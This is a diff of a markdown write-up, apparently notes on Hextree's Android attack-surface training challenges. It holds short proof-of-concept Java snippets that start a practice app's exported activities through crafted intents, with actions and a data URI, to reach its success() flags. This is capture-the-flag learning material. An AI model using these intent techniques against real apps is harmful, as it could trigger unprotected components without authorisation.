@@ -9,26 +9,45 @@ click on the flag activity and we see a call to success() function
 our goal is to reach the success() function in all of these challenges
 #### 1 - basic exported activity
 
- note the package name and complete class name 
+note the package name and complete class name 
 
 write this java code in your POC app
 ```java
 public void onClick(View view) {  
-    Intent intent = new Intent();  
-    intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity");  
-    startActivity(intent);  
+    Intent expintent = new Intent();  
+    expintent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity");  
+    startActivity(expintent);  
 }
 ```
-#### 2 - intent w extras
+#### 2 - Intent w extras
 
-
+snippet from android manifest of flag2 
 ```xml
 <intent-filter>
     <action android:name="io.hextree.action.GIVE_FLAG"/>
 </intent-filter>
 ```
 
+add the code below to the code we wrote for 1 - basic exported activity 
+```java
+expintent.setAction("io.hextree.action.GIVE_FLAG");
+```
 #### 3 - Intent w data URI
+
+snippet from android manifest of flag 3 
+```xml
+<intent-filter>
+    <action android:name="io.hextree.action.GIVE_FLAG"/>
+    <data android:scheme="https"/>
+</intent-filter>
+```
+on clicking flag4activity, it has an if loop that check if the data parsed has a particular URI, so we use that URI while creating the POC app
+
+add the code below to the code we wrote for 1 - basic exported activity 
+```java
+expintent.setAction("io.hextree.action.GIVE_FLAG");
+expintent.setData(Uri.parse("https://app.hextree.io/map/android"));
+```
 
 #### 4 - State machine 
 
